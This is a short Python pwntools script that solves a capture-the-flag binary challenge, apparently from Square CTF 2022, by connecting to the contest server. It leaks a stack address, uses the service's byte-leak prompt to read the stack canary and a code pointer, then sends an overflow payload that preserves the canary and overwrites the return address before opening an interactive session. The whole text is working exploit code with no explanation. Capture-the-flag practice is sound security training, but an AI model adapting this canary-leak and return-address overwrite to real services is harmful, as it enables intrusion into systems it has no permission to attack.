from pwn import *


#p = process("./ez-pwn-2")
p = remote("chals.2022.squarectf.com",4101)
"""
gdb.attach(bash, '''
set follow-fork-mode child
break execve
continue
''')
"""
p.recvuntil(b"You are here: ")

addr = p.recvline().replace(b'\n',b'')
addr = int(addr,16)


stack_canary = addr + 0x20 - 8
print(hex(addr))
print(hex(stack_canary))
print(stack_canary)


rev = p64(stack_canary).hex().encode('utf-8')

print(rev)
p.sendafter(b'I will grant you 8 leaked bytes:\n',rev)
p.recvline()
leaked_canary = int(p.recvline().replace(b'\n',b''),16)
canary_block = p64(leaked_canary)[::-1]
print('Canary:',hex(leaked_canary))

p.sendafter(b'I will grant you 8 leaked bytes:\n',p64(stack_canary+16).hex().encode('utf-8'))
print(p.recvline())
libleak = p.recvline().replace(b'\n',b'')
libaddr = int(p64(int(libleak,16)).hex(),16)

newaddr = libaddr - 0xa21 +0x8f7
print("EXEC LEAK:",hex(libaddr))

p.sendafter(b'I will grant you 8 leaked bytes:\n',rev + b'aaaaaaaa' + canary_block + b'AAAAAAAA' + p64(newaddr))

p.interactive()